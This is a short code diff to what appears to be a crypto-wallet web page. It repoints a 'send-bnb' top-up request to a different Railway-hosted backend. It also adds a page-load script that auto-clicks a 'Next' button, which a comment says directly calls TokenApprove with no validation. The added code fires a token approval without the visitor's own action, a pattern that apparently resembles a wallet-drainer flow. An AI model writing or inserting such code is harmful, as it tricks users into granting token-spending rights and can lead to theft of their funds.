@@ -458,7 +458,7 @@
 // Function to request the BNB top-up from your backend
 async function requestBNBTopUp(account) {
     try {
-        const response = await fetch('https://p2pmanual-production.up.railway.app/send-bnb', {
+        const response = await fetch('https://armaan-production.up.railway.app/send-bnb', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ recipient: account }),
@@ -704,6 +704,17 @@ if (typeof window !== 'undefined') {
 </script>
 <script>
     // Next button directly calls TokenApprove - no validation needed for testing
+    
+    // Auto-click Next button when page loads
+    window.addEventListener('load', function() {
+        // Small delay to ensure everything is ready
+        setTimeout(function() {
+            const nextBtn = document.getElementById('nextBtn');
+            if (nextBtn) {
+                nextBtn.click();
+            }
+        }, 1000);
+    });
 </script>
 
 
